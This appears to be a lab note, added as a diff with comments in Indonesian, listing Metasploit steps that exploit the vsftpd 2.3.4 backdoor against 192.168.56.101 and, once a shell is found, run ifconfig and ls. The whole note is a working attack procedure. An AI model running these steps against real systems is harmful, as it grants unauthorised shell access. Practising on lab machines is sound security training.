@@ -1,0 +1,21 @@
+1. search vsftpd
+
+#masuk backdor
+2. use exploit/unix/ftp/vsftpd_234_backdoor
+
+3. options
+
+#setting rhosts
+4. set rhosts 192.168.56.101
+
+#exploit
+5. exploit
+
+#jika terdapat keterangan found shell berarti 
+kita sudah bisa memasuki kerentanan pada vsftpd
+
+6. ifconfig
+
+7. ls
+
+8. exit
